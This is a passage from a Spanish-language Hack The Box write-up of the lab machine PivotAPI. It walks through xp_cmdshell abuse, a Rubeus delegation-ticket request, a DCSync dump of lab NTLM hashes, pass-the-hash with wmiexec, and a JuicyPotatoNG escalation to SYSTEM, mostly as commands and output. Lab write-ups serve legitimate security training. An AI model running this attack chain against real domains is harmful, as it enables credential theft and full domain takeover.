+[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL> xp_cmdshell whoami
+
+output
+--------------------------------------------------------------------------  
+
+nt service\mssql$sqlexpress
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aprovechando el contexto de esta cuenta podemos subir y usar <a href="https://github.com/GhostPack/Rubeus">Rubeus.exe</a> para obtener un <code class="language-plaintext highlighter-rouge">TGT</code> como el equipo PIVOTAPI mediante un <code class="language-plaintext highlighter-rouge">Constrained Delegation</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> xp_cmdshell C:\ProgramData\Rubeus.exe tgtdeleg /nowrap
+
+output                                                                             
+--------------------------------------------------------------------------------   
+
+   ______        _                                                                 
+  (_____ \      | |                                                                
+   _____) )_   _| |__  _____ _   _  ___                                            
+  |  __  /| | | |  _ \| ___ | | | |/___)                                           
+  | |  \ \| |_| | |_) ) ____| |_| |___ |                                           
+  |_|   |_|____/|____/|_____)____/(___/                                            
+
+  v2.2.3                                                                           
+
+[*] Action: Request Fake Delegation TGT (current user)                             
+
+[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'              
+[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/PivotAPI.LicorDeBellota.htb'   
+[+] Kerberos GSS-API initialization success!                                       
+[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.   
+[*] Found the AP-REQ delegation ticket in the GSS-API output.                      
+[*] Authenticator etype: aes256_cts_hmac_sha1                                      
+[*] Extracted the service ticket session key from the ticket cache: PahqDdIJlWa/OC7QHApnVHKTSYEvORe5Z91QZvBFG0Y=   
+[+] Successfully decrypted the authenticator                                       
+[*] base64(ticket.kirbi):                                                          
+
+      doIFeDCCBXSgAwIBBaEDAgEWooIEajCCBGZhggRiMIIEXqADAgEFoRQbEkxJQ09SREVCRUxMT1RBLkhUQqInMCWgAwIBAqEeMBwbBmtyYnRndBsSTElDT1JERUJFTExPVEEuSFRCo4IEFjCCBBKgAwIBEqEDAgECooIEBASCBADc57nRcGoiUlbrVa9E/ZF7Nt+5MzGaDZyrGjHhX9+VHPoLTpPSWp5+MTI3lpUnnRKblJ4Ol7xsKCl3MhcglwZN3Ep37JHbZTwM42fQWGjmQieh63VFDHMfd0k1pn6xv+MUBQt22atbuGzUDHm3kmsAi+McfOntFWP9k3j/GLsu8letpoPMKyPNz7gP6n1noi8S5CQJ7JThyj4xVxJywXmXvNSBPkZCqQzXG6Ibs9LCxJxOpBkQ3tNq+X4vxdU2d9LwmPPWLgGsJEl78PzqxG36usvNsd8prm+sknwjgYts/KSvHfshr1fX+YQv5FjfMNsqqR02X4yzaz9as8QMagm3o27fJxs7yg6owY7rICK3x9OsQg0SsAbTRzLi72ZiRvCMaLausMgybNln7TqGY/tN1Ujr1DboWuZWhwFT4DdhOr7swLjoydSOr8AqRt18dNymgjtWlcOTLtERx4u/efI/17BmTBcDUYnECFtrYCa9AQUAsBBOHm91Murzlm6lL/Br4361BeJgMBfn+KeNXFKL84PCc0heDc3mDwHvxO3Wy9M4ZTENc7WSOPBaVG1emQrVONF61Ns8XUdLFYLy7lDWQzIvOX/roXuL3/HXaRmVruZ8YXrAWDyi07M7SHxnwSSXzTL+asm7CTC+aCJS2MhMWLLMKH8ZIpn2Gy3vFl4QkSOqtxzYnX9roLx7tAzyu833OiY8muODQIs6E+ae2hJHkrHZx48GrsBStffHZx3wQbWLLc5jSnUw5O3iSEiX95umIeTW30841JN2NbpNa2GT6ePmOXpdyN0eXcdz/T7TG6z9eSUWWHcYKWOjjc/THxyF9PC261heOhxsrGaU885eWyjFogPJwdQ+Xb0y8EiwnYmi3BywDHhl4ZFFPv0QA9LAVU8NfWVM9T1+ZAlJiuM//JJr4O1Vz9ZlRRAb8KDmO2x+7BlnXrsta8ChpdxUifmUAHZCFXVuQ/2tdvasF38BpF5Ytfsb4E+yepv2ZmVMViaMQGylDRNYy50Kis7f7LxIShhcYE+o/IsmmD1VRDpZiWsOlstVb6YN8ePih4RL8uwGrq+Dt2SJHRPtXST5zAnPKR2JeuiOOfepofInjqmasu5henn731vqGDIz5QD0uYRsg3Rvwqo45MwKsF9EJGCQbShH3QUwMbTTF4iqy4SctlirytT/CoIb1besnLwnXxJRk79OrHVIeS382/RP9/fYdSq3ZbEFgyDCyYdirerVZ7LB0mmEWfQ2z2vQhnyT5AYGdhbDAAHXdlN1Zqv/JFN1DrX3WD2pLrySzxRKuDLyxFcbHadVQwg/FuS1GTzANFLNegDbaA4EQkF18yUjqUdOVIZF2ix9YMHzeYlhzmHFo4H5MIH2oAMCAQCige4Eget9gegwgeWggeIwgd8wgdygKzApoAMCARKhIgQgydFDhzUIwnyst1v+v4+db/5KHS+ut4fU9tjm8eGA6UOhFBsSTElDT1JERUJFTExPVEEuSFRCohYwFKADAgEBoQ0wCxsJUElWT1RBUEkkowcDBQBgoQAApREYDzIwMjMwNzA4MjMyMDEwWqYRGA8yMDIzMDcwOTA5MjAxMFqnERgPMjAyMzA3MTUyMzIwMTBaqBQbEkxJQ09SREVCRUxMT1RBLkhUQqknMCWgAwIBAqEeMBwbBmtyYnRndBsSTElDT1JERUJFTExPVEEuSFRC  
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Decodeamos este <code class="language-plaintext highlighter-rouge">base64</code> para obtener el <code class="language-plaintext highlighter-rouge">ticket.kirbi</code>, despues con <code class="language-plaintext highlighter-rouge">ticketConverter</code> lo convertimos a <code class="language-plaintext highlighter-rouge">ccache</code> y lo exportamos en la variable</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ base64 </span><span class="p">-d kirbi.b64 > ticket.kirbi
+
+</span><span class="ve">❯ impacket-ticketConverter </span><span class="p">ticket.kirbi PIVOTAPI.ccache
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation  
+
+[*] converting kirbi to ccache...
+[+] done
+
+</span><span class="ve">❯ export </span><span class="p">KRB5CCNAME=PIVOTAPI.ccache</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Comprobamos la autenticacion con el ticket con <code class="language-plaintext highlighter-rouge">crackmapexec</code> y al equipo tener privilegios <code class="language-plaintext highlighter-rouge">DCSync</code> sobre el dominio podemos dumpear los hashes del <code class="language-plaintext highlighter-rouge">ntds.dit</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb licordebellota.htb -k --use-kcache
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="ve">[+] </span><span class="p">LicorDeBellota.htb\ from ccache
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">smb licordebellota.htb -k --use-kcache --ntds drsuapi
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="ve">[+] </span><span class="p">LicorDeBellota.htb\ from ccache 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="ro">[-] </span><span class="p">RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="ve">[+] </span><span class="p">Dumping the NTDS, this could take a while so go grab a redbull...
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">Administrador:500:aad3b435b51404eeaad3b435b51404ee:105394e5d4f382f74c50871445a3ab8d:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3fc8c66f79c15020a2c2c7f1cffd8049:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">cybervaca:1000:aad3b435b51404eeaad3b435b51404ee:c33f387f6f7ab01aa1a8a29039d9feef:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\3v4Si0N:1107:aad3b435b51404eeaad3b435b51404ee:bcc9e3e5704ae1c7a91cbef273ff23e5:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\Kaorz:1109:aad3b435b51404eeaad3b435b51404ee:9c26ac73552428b4b624e7fbcc720b85:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\jari:1116:aad3b435b51404eeaad3b435b51404ee:139fcd90ef171f43ef5b48025f773848:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\superfume:1117:aad3b435b51404eeaad3b435b51404ee:c01b3d82fc3a76d64cf96d00ca94a01e:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\Dr.Zaiuss:1118:aad3b435b51404eeaad3b435b51404ee:aaf845085d7e3a44fd5898b464c8828a:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\svc_mssql:1124:aad3b435b51404eeaad3b435b51404ee:1d6560177f8b7f90b7d24135c79171d8:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">sshd:1127:aad3b435b51404eeaad3b435b51404ee:45550414512a5121c51156ab5fec3826:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\gibdeon:1128:aad3b435b51404eeaad3b435b51404ee:0b772ce29eaab6e20a94b4a580ff1510:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\lothbrok:1129:aad3b435b51404eeaad3b435b51404ee:30ae5986b063af4ba111092903d2bf6f:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\0xVIC:1131:aad3b435b51404eeaad3b435b51404ee:d1e65cec96ac1620d7877503b8cb4ca0:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\StooormQ:1132:aad3b435b51404eeaad3b435b51404ee:091880b0a37cc92c845a8c1d80cbfb23:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\manulqwerty:1133:aad3b435b51404eeaad3b435b51404ee:99bc0e7f7d71c34264993592235174f0:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\borjmz:1134:aad3b435b51404eeaad3b435b51404ee:6d6eddc7dac47bae01aa0f6f29e1f1fe:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\v1s0r:1135:aad3b435b51404eeaad3b435b51404ee:a1f29e21f35c9dc166f7e91df5f29915:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\FrankyTech:1136:aad3b435b51404eeaad3b435b51404ee:59997b2285ab1f0d963899977710a424:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\Gh0spp7:1137:aad3b435b51404eeaad3b435b51404ee:5122834c2bdf0b4a057cae442579934b:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\socketz:1138:aad3b435b51404eeaad3b435b51404ee:83f925c449323b8730c4f10f67ed7b74:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\Fiiti:1139:aad3b435b51404eeaad3b435b51404ee:b75d0d5904a7ca04ba8a5dec8620f05f:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\OscarAkaElvis:1140:aad3b435b51404eeaad3b435b51404ee:f4f67ce9289c0a553bff7a9202b1134a:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\Jharvar:1141:aad3b435b51404eeaad3b435b51404ee:9e8c4b8f296632bed56ba990d7d514de:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\aDoN90:1142:aad3b435b51404eeaad3b435b51404ee:1947e3281d6991918b445f8416181a86:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\ippsec:7606:aad3b435b51404eeaad3b435b51404ee:841840851c60fd28ca0cc2490288ea5f:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\0xdf:7607:aad3b435b51404eeaad3b435b51404ee:ec371925a952efcb9ccfc335b963aa6d:::
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">PIVOTAPI$:1004:aad3b435b51404eeaad3b435b51404ee:1774d3c67e7d9945c48ccb30d89a83bb:::</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente usando psexec o <code class="language-plaintext highlighter-rouge">wmiexec</code> con el hash del usuario <code class="language-plaintext highlighter-rouge">Administrador</code> podemos mediante un passthehash obtener una <code class="language-plaintext highlighter-rouge">powershell</code> semi-interactiva</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-wmiexec </span><span class="p">licordebellota.htb/Administrador@pivotapi.licordebellota.htb -hashes :105394e5d4f382f74c50871445a3ab8d -shell-type powershell  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+PS C:\> </span><span class="am">whoami</span><span class="p">
+licordebellota\administrador
+
+PS C:\> </span><span class="am">type</span><span class="p"> C:\Users\cybervaca\Desktop\root.txt
+d9a**************************ad7
+
+PS C:\></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="altern2-administrator">
+<br><h3 class="post-title">Alternativa 2 - Administrator</h3><br>
+
+<p class="plain-text">Otra forma es mediante <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> ya que este usuario de servicio tiene habilitado el privilegio <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> que nos permite <code class="language-plaintext highlighter-rouge">suplantar</code> a un usuario</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> xp_cmdshell whoami /priv
+
+output                                                                             
+--------------------------------------------------------------------------------   
+
+INFORMACIÓN DE PRIVILEGIOS                                                         
+--------------------------                                                         
+
+Nombre de privilegio          Descripción                                       Estado       
+============================= ================================================= =============  
+SeAssignPrimaryTokenPrivilege Reemplazar un símbolo (token) de nivel de proceso Deshabilitado
+SeIncreaseQuotaPrivilege      Ajustar las cuotas de la memoria para un proceso  Deshabilitado
+SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio          Deshabilitado
+SeChangeNotifyPrivilege       Omitir comprobación de recorrido                  Habilitada
+SeManageVolumePrivilege       Realizar tareas de mantenimiento del volumen      Habilitada
+SeImpersonatePrivilege        Suplantar a un cliente tras la autenticación      Habilitada
+SeCreateGlobalPrivilege       Crear objetos globales                            Habilitada
+SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso      Deshabilitado
+                                                                            
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Como no tenemos conexion crearemos un archivo <code class="language-plaintext highlighter-rouge">shell.bat</code> que ejecutara el comando <code class="language-plaintext highlighter-rouge">whoami</code> y leera la flag, depositaremos el <code class="language-plaintext highlighter-rouge">output</code> en un archivo txt</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">whoami </span><span class="o">> </span><span class="p">C:\ProgramData\output.txt
+type C:\Users\cybervaca\Desktop\root.txt </span><span class="o">>></span><span class="p"> C:\ProgramData\output.txt  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <a href="https://github.com/antonioCoco/JuicyPotatoNG">JuicyPotatoNG.exe</a> ejecutaremos el archivo <code class="language-plaintext highlighter-rouge">shell.bat</code>, este ejecutable nos ayudara a aprovechar este privilegio y suplantar a <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> xp_cmdshell C:\ProgramData\JuicyPotatoNG.exe -t * -p C:\ProgramData\shell.bat
+
+output                                                                             
+--------------------------------------------------------------------------------   
+
+	 JuicyPotatoNG                                                                    
+	 by decoder_it & splinter_code                                                    
+
+[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247    
+[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation  
+[+] CreateProcessAsUser OK                                                         
+[+] Exploit successful!                                                            
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de ejecutar el <code class="language-plaintext highlighter-rouge">shell.bat</code> nos crea un archivo en <code class="language-plaintext highlighter-rouge">C:\ProgramData</code> llamado <code class="language-plaintext highlighter-rouge">output.txt</code> que contiene el output de los comandos, en este archivo podemos ver que el output de whoami fue <code class="language-plaintext highlighter-rouge">nt authority\system</code> y la otra linea tiene la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> xp_cmdshell type C:\ProgramData\output.txt
+
+output
+--------------------------------------------------------------------------  
+
+nt authority\system
+d9a**************************ad7
+
+SQL></span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
